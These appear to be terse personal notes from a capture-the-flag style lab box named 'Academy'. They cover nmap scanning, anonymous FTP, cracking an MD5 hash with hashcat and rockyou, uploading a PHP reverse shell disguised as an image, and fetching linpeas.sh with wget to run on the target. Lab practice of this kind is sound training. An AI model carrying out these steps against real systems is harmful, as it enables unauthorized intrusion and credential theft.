### Academy Box
login root
pass tcm

- setup dns
	- dhclient
	- ip a

nmap -A -p- -T4 $ip 

POI list
- vsftpd
- anonymous login
- openssh 7.9
- apache 2.4.38
- default apache page 

$ ftp $ip
$ get note.txt
$ hash-identifier 
	might be md5
google hashcat crack md5
google hashcat modules
$ vim hast.txt
$ locate rockyou.txt
$ hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt

$ip/academy/my-profile.php

google php reverse shell

upload code as picture

google linpeas
download linpeas.sh
$ python3 -m http.server 80

$ wget http://$ip/linpeas.sh
$ chmod +x linpeas.sh
$ ./linpeas.sh
